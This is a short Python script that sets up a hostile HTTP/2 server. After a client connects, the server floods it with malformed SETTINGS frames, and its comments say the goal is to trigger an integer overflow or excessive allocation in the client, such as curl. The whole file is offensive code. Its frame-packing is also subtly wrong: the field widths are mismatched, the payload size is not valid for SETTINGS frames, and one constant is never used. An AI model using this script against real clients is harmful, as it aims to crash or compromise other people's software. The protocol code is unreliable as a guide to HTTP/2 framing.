import socket
import struct

# HTTP/2 Connection Preface (Client usually sends this, but we send it back to confuse)
PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'


def build_frame(length, type, flags, stream_id, payload):
    # Length (24), Type (8), Flags (8), R (1), StreamID (31)
    header = struct.pack("!BHIB", type, flags, stream_id, 0)
    # Pack 24-bit length manually
    len_bytes = struct.pack("!I", length)[1:]
    return len_bytes + header[1:] + payload


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 8080))
sock.listen(5)

print("HTTP/2 Malice Server Listening on 8080...")

while True:
    conn, addr = sock.accept()
    try:
        # 1. Read the client's preface (curl sending to us)
        data = conn.recv(1024)

        # 2. Send our own preface back (server preface is usually just SETTINGS)
        # Type 4 = SETTINGS, Flags 0, Stream 0
        settings_frame = build_frame(0, 4, 0, 0, b'')
        conn.sendall(settings_frame)

        # 3. THE ATTACK: Send a SETTINGS frame with a huge payload length
        # intended to cause an integer overflow or excessive allocation
        # Type 4 (SETTINGS), Flags 0, Stream 0, Payload 1000 bytes of 'A'
        malformed = build_frame(1000, 4, 0, 0, b'A' * 1000)

        # Flood it
        for _ in range(50):
            conn.send(malformed)

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        conn.close()